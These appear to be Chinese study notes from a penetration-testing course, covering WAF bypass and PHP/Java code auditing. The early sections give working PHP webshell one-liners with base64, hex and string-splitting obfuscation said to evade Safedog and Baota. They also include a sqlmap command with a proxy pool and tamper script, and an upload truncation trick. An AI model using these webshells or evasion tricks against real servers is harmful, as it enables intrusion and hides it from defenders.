<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#充钱换代理池可以基本解决扫描目录的问题</span><br></pre></td></tr></table></figure>

<h3 id="day48-WAF绕过-权限绕过之代码混淆及行为造轮子"><a href="#day48-WAF绕过-权限绕过之代码混淆及行为造轮子" class="headerlink" title="day48-WAF绕过-权限绕过之代码混淆及行为造轮子"></a>day48-WAF绕过-权限绕过之代码混淆及行为造轮子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">权限控制</span><br><span class="line">	脚本</span><br><span class="line">		ASP PHP ASPX PY.WAR等</span><br><span class="line">	工具</span><br><span class="line">		菜刀 蚁剑 冰蝎</span><br><span class="line">	代码</span><br><span class="line">		加密混淆 变量覆盖 异或生成</span><br><span class="line">	行为</span><br><span class="line">		指纹变异 自写轮子</span><br><span class="line">	检测</span><br><span class="line">		常规安全工具脚本使用</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#测试环境为安全狗+宝塔+阿里云</span></span><br><span class="line"><span class="comment">#变量覆盖</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="variable">$$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;z&#x27;</span>]);</span><br><span class="line"><span class="comment">//?x=b&amp;y=assert		post中z=phpinfo();	可以绕过安全狗的变量追踪</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1668433978904.png" alt="1668433978904"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">上述一句话可以绕过安全狗，但是绕不过宝塔，phpinfo是风险值，加入base64编码</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;x&#x27;];</span><br><span class="line">$$a=$_GET[&#x27;y&#x27;];</span><br><span class="line">$b(base64_decode($_POST[&#x27;z&#x27;]));</span><br><span class="line">//?x=b&amp;y=assert 	post中z=cGhwaW5mbygpOw==			绕过宝塔</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#加密混淆</span><br><span class="line">http://www.phpjiami.com/</span><br><span class="line">加密后有乱码但是有能正常执行</span><br><span class="line">没有可读性，安全狗宝塔阿里云解密不了不拦截</span><br><span class="line">#异或生生成 python ^ 异或</span><br><span class="line">github项目webshell-venom自动webshell混淆		直接复制通杀</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1668436363889.png" alt="1668436363889"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传参先判断是否有id决定是是不是base64解密</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#蚁剑连接上面有编码器可以选到base64</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#菜刀，蚁剑，冰蝎优缺点	xiaodi推崇冰蝎</span><br><span class="line">菜刀	未更新状态，无插件，单向加密传输</span><br><span class="line">蚁剑	更新状态，有插件，拓展性强，单向加密传输</span><br><span class="line">冰蝎	更新状态，未知插件，双向加密传输(返回数据包同样加密)</span><br><span class="line">	冰蝎有后渗透的模块</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件的名字也改一下，不要shell.php这种</span><br><span class="line">#进一步操作被发现冰蝎蚁剑指纹</span><br><span class="line">#回显包的数据如果没有加密容易被发现问题</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#下图为base64加密覆盖的 注意password为z path要用：分割</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1668440278281.png" alt="1668440278281"></p>
<h3 id="day49-WAF绕过-漏洞利用之注入上传跨站等绕过"><a href="#day49-WAF绕过-漏洞利用之注入上传跨站等绕过" class="headerlink" title="day49-WAF绕过-漏洞利用之注入上传跨站等绕过"></a>day49-WAF绕过-漏洞利用之注入上传跨站等绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#测试环境 sqllab 安全狗</span><br><span class="line">#一些绕过经验</span><br><span class="line">使用代理池	花钱隧道代理</span><br><span class="line">sqlmap UA头换掉</span><br><span class="line">--tamper rdog.py自己模仿写一个在注入语句中替换一些绕过语句</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://...../sqlilabs/Less-2/?id=1&quot; --proxy=&quot;http://tps123.kdlapi.com&quot; --tamper=rdog.py --user-agent=&quot;.....&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1668520828721.png" alt="1668520828721"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#测试环境 sqllab 安全狗+宝塔</span><br><span class="line">宝塔会对 /* 过滤</span><br><span class="line">%00/*	可以绕过 %00截断之后的宝塔看不到  在--tamper的rdog.py文件加 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#测试环境 pikachu 文件上传</span><br><span class="line">截断就完事?		看前面的</span><br><span class="line">x.p</span><br><span class="line">h</span><br><span class="line">p</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#测试环境 pikachu rce</span><br><span class="line">宝塔过滤base64_decode(</span><br><span class="line">可逆加密只有url编码 base64编码 hex编码</span><br><span class="line">hex好像可以</span><br><span class="line">$str = &quot;phpinfo();&quot;</span><br><span class="line">$hex = bin2hex($hex);</span><br><span class="line">echo pack(”H*&quot;,$hex)		#此处还原出phpinf();的字符格式</span><br><span class="line">post中</span><br><span class="line">txt=$hex=&#x27;.....&#x27;;assert(pack(&quot;H*&quot;,$hex));</span><br><span class="line">txt=$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,pxhxpxixnxfxo());assert($y);</span><br><span class="line">#如果拦截assert用提交方式写进来</span><br><span class="line">txt=$x=&#x27;ass&#x27;;$xx=&#x27;ert&#x27;;$xxx=$x.$xx;$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,pxhxpxixnxfxo());$xxx($y);</span><br><span class="line">#$_GET被宝塔过滤可以换成$_REQUEST</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#测试环境 pikachu 文件包含</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php.ini</span><br><span class="line">safe_mode</span><br><span class="line">disable_functions</span><br><span class="line">这俩会禁用执行函数</span><br></pre></td></tr></table></figure>

<h3 id="day50-代码审计-PHP无框架项目SQL注入挖掘技巧"><a href="#day50-代码审计-PHP无框架项目SQL注入挖掘技巧" class="headerlink" title="day50-代码审计-PHP无框架项目SQL注入挖掘技巧"></a>day50-代码审计-PHP无框架项目SQL注入挖掘技巧</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">工具</span><br><span class="line">	fortify</span><br><span class="line">		网盘下载，xiaodi8.com有破解教程</span><br><span class="line">	seay	中文</span><br><span class="line">必备知识点</span><br><span class="line">	环境安装搭建使用 相关工具插件安装 前期各种漏洞原理及利用</span><br><span class="line">开始前准备</span><br><span class="line">	审计程序名 版本 当前环境（系统，中间件，脚本语言等信息） 各种插件</span><br><span class="line">代码审计挖掘漏洞根本</span><br><span class="line">	可控变量</span><br><span class="line">		变量接受</span><br><span class="line">	特定函数</span><br><span class="line">		比如echo print尝试找xss</span><br><span class="line">	不存在过滤或过滤不严谨存在绕过导致安全漏洞</span><br><span class="line">	定点挖掘功能点</span><br><span class="line">		挖掘文件上传 会员中心存在文件上传的操作地址 抓包分析找到源码中特定文件代码段 进行文件上传代码分析</span><br><span class="line">	sql注入 数据库监控-监控到当前页面和数据库交互过程（SQL执行语句）</span><br><span class="line">	断点调试 访问页面对应代码进行断点调试（执行过程前后顺序 调用文件列表等）</span><br><span class="line"></span><br><span class="line">magic_...?</span><br><span class="line">	宽字节</span><br><span class="line">	二次注入</span><br><span class="line">		类似会员中心修改信息的模块 insert update 变量可控</span><br></pre></td></tr></table></figure>

<h3 id="day51-代码审计-PHP框架MVC类上传断点调式挖掘"><a href="#day51-代码审计-PHP框架MVC类上传断点调式挖掘" class="headerlink" title="day51-代码审计-PHP框架MVC类上传断点调式挖掘"></a>day51-代码审计-PHP框架MVC类上传断点调式挖掘</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.关键字搜索 函数 键字 全局变量</span><br><span class="line">	e.g.	文件上传 $_FILES move_uploaded_file</span><br><span class="line">	https://blog.csdn.net/haoyunyun888/article/details/81079274</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bees搭建 /BEES/install按提示 后台管理admin admin 数据库root root</span><br><span class="line">	很多cms后台功能更多</span><br><span class="line">	/BEES/admin/admin_file_upload.php	经过初步审计没有上传漏洞，试了截断</span><br><span class="line">	/BEES/admin/admin_pic_upload.php	此处是检测MIME类型可以绕过，存在漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#断点调试</span><br><span class="line">phpstorm		类似pycharm ideal</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#MVC the model view controller architecture</span><br><span class="line">model 管理大部分业务逻辑和所有数据库逻辑 模型提供连接和操作数据库抽象层</span><br><span class="line">controller 负责响应用户请求 准备数据 以及决定如何展示这些数据</span><br><span class="line">view 渲染数据 通过html呈现给用户</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1668753526565.png" alt="1668753526565"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#php5</span><br><span class="line">做成框架的mvc</span><br></pre></td></tr></table></figure>

<h3 id="day55-代码审计-java项目注入上传搜索或插件挖掘"><a href="#day55-代码审计-java项目注入上传搜索或插件挖掘" class="headerlink" title="day55-代码审计-java项目注入上传搜索或插件挖掘"></a>day55-代码审计-java项目注入上传搜索或插件挖掘</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">审计技术</span><br><span class="line">	全局搜索 ctrl+shift+F</span><br><span class="line">	引用追踪 alt+f7或者查找引用</span><br><span class="line">	功能定点 配合burp定位代码文件</span><br><span class="line">	插件分析 fortify扫描 idea+findbugs</span><br><span class="line">审计方向</span><br><span class="line">	代码分析</span><br><span class="line">		常规</span><br><span class="line">		非常规</span><br><span class="line">	开发框架</span><br><span class="line">		shiro</span><br><span class="line">		maven</span><br><span class="line">		spring</span><br><span class="line">		struts</span><br><span class="line">		mybatis</span><br><span class="line">		springmvc</span><br><span class="line">	中间件容器 </span><br><span class="line">		jetty</span><br><span class="line">		jboss</span><br><span class="line">		tomcat</span><br><span class="line">		weblogic</span><br><span class="line">		webshere</span><br><span class="line">		glassfish</span><br><span class="line">审计漏洞 参考webgoat</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/image-20230515100414175.png" alt="image-20230515100414175"></p>
<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/image-20230515100541027.png" alt="image-20230515100541027"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javaweb执行流程</span><br><span class="line">https://www.cnblogs.com/1987721594zy/p/9186584.html</span><br><span class="line">https://blog.csdn.net/weily11/article/details/80643472</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1200305-20180615104548781-252441748.png" alt="1200305-20180615104548781-252441748"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">com 公司项目 copyright由项目发起的公司所有</span><br><span class="line">包名 com.公司名.项目名.模块名</span><br><span class="line">持久层 dao persist mapper</span><br><span class="line">实体层 entity model bean javabean pojo</span><br><span class="line">业务逻辑 service biz</span><br><span class="line">控制器 controller servlet action web</span><br><span class="line">过滤器 filter</span><br><span class="line">异常 exception</span><br><span class="line">监听器 listener</span><br><span class="line">在不同框架下一般包的命名规则不同，但大概如上，不同功能的java文件放在不同的包中，根据java文件的功能统一安放及命名</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">审计思路</span><br><span class="line">	根据业务逻辑功能审计优点</span><br><span class="line">	明确程序的架构以及业务逻辑，明确数据流向</span><br><span class="line">	获取参数-&gt;表现层-&gt;业务层-&gt;持久层 通读源码</span><br><span class="line">缺点 耗费时间</span><br><span class="line"></span><br><span class="line">根据敏感函数审计</span><br><span class="line">	高效挖出想要的漏洞，判断敏感函数上下文，追踪参数源头</span><br><span class="line"></span><br><span class="line">开始前</span><br><span class="line">1.确定框架</span><br><span class="line">	web.xml / 导入的jar包或pom.xml / 看配置文件</span><br><span class="line">	配置文件</span><br><span class="line">        struts2			struts.xml</span><br><span class="line">        spring 			applicationContext.xml</span><br><span class="line">        spring mvc 		spring-mvc.xml</span><br><span class="line">        hibernate		hibernate.cfg.xml</span><br><span class="line">        mybatis			mybatis-config.xml</span><br><span class="line">2.web.xml文件 确定是否配置相关拦截器</span><br><span class="line">	/src/main/webapp/WEB-INF/web.xml</span><br><span class="line"></span><br><span class="line">jsp	能写java的html</span><br><span class="line"></span><br><span class="line">正确的预编译机制很难绕过</span><br><span class="line"></span><br><span class="line">javaweb-sec跑不起来</span><br><span class="line">	org.springframework.beans.factory.parsing.BeanDefinitionParsingException: Configuration problem: Unable to locate Spring NamespaceHandler for XML schema namespace [http://www.springframework.org/schema/tx]</span><br><span class="line">Offending resource: ServletContext resource [/WEB-INF/applicationContext.xml]</span><br><span class="line"></span><br><span class="line">idea插件findbugs		装不上开插件ideal打不开 日</span><br><span class="line">https://www.cnblogs.com/kingsonfu/p/12419817.html</span><br><span class="line">	不能分析jsp格式</span><br><span class="line">	</span><br><span class="line">fortify</span><br><span class="line">	&quot;Scan Java Project&quot; 选择项目 选择Java版本 选择默认选项 其中第三项一定位Yes 选择Scan</span><br><span class="line">	扫出可能的点人工去看</span><br><span class="line"></span><br><span class="line">全局搜索关键字</span><br><span class="line">	出入查找的关键字 可选择查找范围 可选择大小写 整字匹配 正则表达式 脚本类型</span><br><span class="line">	比如 select 数据库连接函数</span><br><span class="line"></span><br><span class="line">引用追踪</span><br><span class="line">	选择函数 右键 查找使用		快捷键 alt+f7</span><br><span class="line"></span><br><span class="line">web.xml查看filter信息</span><br><span class="line">pom.xml查看包的</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	建议Demo段SQL注入及预编译</span></span><br><span class="line">GET接受参数<span class="string">&quot;user&quot;</span></span><br><span class="line">	String user = request.getParamater(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">建立数据库连接</span><br><span class="line">	Connection = getConnection();</span><br><span class="line">定义最终执行的SQL语句</span><br><span class="line">	String sql = <span class="string">&quot;select host,user from mysql.user where=&#x27;&quot;</span> + user + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    String sql = <span class="string">&quot;select host,user from mysql.user where = ?&quot;</span>;</span><br><span class="line">创建预编译对象</span><br><span class="line">	PreparedStatement pstt = connection.prepareStatement(sql);</span><br><span class="line">执行并获取返回结果对象</span><br><span class="line">	ResultSet rs = pstt.executeQuery();</span><br></pre></td></tr></table></figure>

<h3 id="day56-代码审计-JAVA项目Filter过滤器及XSS挖掘"><a href="#day56-代码审计-JAVA项目Filter过滤器及XSS挖掘" class="headerlink" title="day56-代码审计-JAVA项目Filter过滤器及XSS挖掘"></a>day56-代码审计-JAVA项目Filter过滤器及XSS挖掘</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	寻求绕过</span></span><br><span class="line">	看构成 看指向 看配置 看代码</span><br><span class="line"></span><br><span class="line"><span class="comment">#	Filter过滤器配置启用及查看</span></span><br><span class="line">	查看web.xml文件了解代码有无Filter过滤器</span><br><span class="line">	可以通过<span class="string">&quot;导航&quot;</span><span class="string">&quot;文件&quot;</span>来直接搜索</span><br><span class="line">	&lt;<span class="built_in">filter</span>&gt;是过滤器的标识，&lt;<span class="built_in">filter</span>-name&gt;是过滤器名字</span><br><span class="line">	&lt;<span class="built_in">filter</span>-<span class="keyword">class</span>&gt;是过滤器代码的路径，分清过滤器在内部还是外部，根据路径来判断</span><br><span class="line">	&lt;<span class="built_in">filter</span>-mapping&gt;是路由设置，其中&lt;<span class="built_in">filter</span>-name&gt;是路由名,&lt;url-pattern&gt;是触发路由的地址&lt;dispatcher&gt;是相关的配置信息</span><br><span class="line">	一个项目会有不止一个过滤器</span><br><span class="line">	当过滤器的触发条件被满足，其中的核心代码就会被执行</span><br><span class="line"></span><br><span class="line"><span class="comment">#	知识点</span></span><br><span class="line">	Filter是JavaWeb中的过滤器，用于过滤URL请求。通过Filter可以实现URL请求资源权限验证、用户登录检测等功能。</span><br><span class="line">	Filter是个接口，实现Filter只需重写init、doFilter、destory方法即可</span><br><span class="line">	Filter和Servlet一样是Java Web中最为核心的部分，使用Servlet和Filter可以实现后端接口开发和权限控制，当然使用Filter机制也可以实现MVC框架，Struts2实现机制就是使用Filter</span><br><span class="line">    Filter的配置类似与Servlet，由&lt;<span class="built_in">filter</span>&gt;和&lt;<span class="built_in">filter</span>-mapping&gt;两组标签组成，如果Servlet版本大于<span class="number">3.0</span>同样可以使用注解的方式配置Filter。</span><br><span class="line"></span><br><span class="line"><span class="comment">#	Jeesns过滤器分析绕过防护代码</span></span><br><span class="line">	查看web.xml，找到Filter</span><br><span class="line">	如果查找使用发现一个对象未找到出处，可能是因为声明代码的地方在.jar包中</span><br><span class="line">	读代码可知，jeesns1<span class="number">.3</span>的版本把呢不能使用脚本关键字过滤，过滤不完全，产生漏洞</span><br><span class="line">    由于触发条件时<span class="string">&quot;/*&quot;</span>,所以访问任意文件二号目录都会触发该过滤器</span><br><span class="line">    读代码，过滤的时url请求的参数，找到有输出的地方即可测试XSS</span><br><span class="line"></span><br><span class="line"><span class="comment">#	Struts框架类过滤器简要分析测试</span></span><br><span class="line">	框架类的过滤器看的文件不是web.xml，每个框架各不相同，指向必然是外部，触发的请求和规则也不同</span><br><span class="line">    找不到过滤器，根据网络资料，发现struts的语法不同，以&lt;interceptors&gt;开头</span><br><span class="line">    依旧找不到过滤器，查看是否有包含文件</span><br><span class="line">    分析过滤器:找到它们的声明，分析过滤的规则</span><br><span class="line">        有一些过滤器与安全无关，可以不看，看特定关键字的过滤器</span><br><span class="line">        </span><br><span class="line"><span class="comment">#	涉及资源</span></span><br><span class="line">	Struts2拦截器的配置和使用：http://c.biancheng.net/view/<span class="number">4106.</span>html</span><br></pre></td></tr></table></figure>

<h3 id="day57-代码审计-JAVA项目框架类漏洞分析报告"><a href="#day57-代码审计-JAVA项目框架类漏洞分析报告" class="headerlink" title="day57-代码审计-JAVA项目框架类漏洞分析报告"></a>day57-代码审计-JAVA项目框架类漏洞分析报告</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	JAVA框架	分析核心:断点调试</span></span><br><span class="line">	框架识别		引用配置获取</span><br><span class="line">	利用已知漏洞		名称及版本号</span><br><span class="line">	挖掘未知漏洞		过滤器 拦截器 框架特性 执行流程</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/b5d3b10dd0d7d6ea10e7a7b02fed848553a7ecad.jpg@737w_882h_progressive.webp" alt="img"></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#	图例</span><br><span class="line">	<span class="number">1</span>.HttpServletRequest		请求信息</span><br><span class="line">	<span class="number">2</span>.Filter Dispatcher		最底层过滤器</span><br><span class="line">	<span class="number">3</span>.ActionMapping				Struct2中主要检测请求信息是否需要Struts2处理</span><br><span class="line">	<span class="number">4</span>.ActionProxy			中间层可以调用其它类什么的</span><br><span class="line">	<span class="number">5</span>.ConfigurationManager			负责将struts.xml文件中配置文件映射到内存中去</span><br><span class="line">	<span class="number">6</span>.Struts.xml						Struts配置文件需要程序员填写</span><br><span class="line">	<span class="number">7</span>.ActionInvocation			包含<span class="number">4</span>个属性分别获取前端传递的值，action,struts.xml 其它一些信息</span><br><span class="line">	<span class="number">8</span>.Interceptor			拦截器不是太理解应该是获取前端传递的属性值，然后封装到action的属性域中</span><br><span class="line">	<span class="number">9</span>.HttpServletResponse		响应用户的类</span><br><span class="line">	</span><br><span class="line">...</span><br><span class="line">	</span><br><span class="line">#	最后总结</span><br><span class="line">	Struts2</span><br><span class="line">	已知漏洞：找框架自身版本，利用漏洞库去确定漏洞</span><br><span class="line">	未知漏洞：执行流程，过滤器、拦截器、框架特性</span><br><span class="line">	验证：</span><br><span class="line">		采用断点调试，确定.action文件断点后，无法拦截执行请求，说明满足路由规则请求方法后跳出过滤拦截器，绕过实现ognl表达式漏洞</span><br><span class="line">	</span><br><span class="line">	Spring</span><br><span class="line">	已知漏洞:..</span><br><span class="line">	有spel表达式注入漏洞-未知漏洞测试</span><br><span class="line">	从自身源码分析到文件sql语句有注入漏洞，尝试成功(未发现过滤器及拦截器)</span><br><span class="line">	</span><br><span class="line">...</span><br></pre></td></tr></table></figure>





<h3 id="day58-权限提升-网站权限后台漏洞第三方获取"><a href="#day58-权限提升-网站权限后台漏洞第三方获取" class="headerlink" title="day58-权限提升-网站权限后台漏洞第三方获取"></a>day58-权限提升-网站权限后台漏洞第三方获取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#具体哪些权限需要知道和了解</span><br><span class="line">后台权限</span><br><span class="line">	只能操作应用界面的内容数据图片等信息，无法操作程序的源代码或服务器上得到资源文件</span><br><span class="line">网站权限</span><br><span class="line">	查看或修改程序源代码，可以对网站或应用的配置文件读取，还能收集服务器操作系统相关你的信息，为后续系统提权做准备</span><br><span class="line">数据库权限</span><br><span class="line">	操作数据库的权限。</span><br><span class="line">接口权限	邮件 短信 支付</span><br><span class="line">	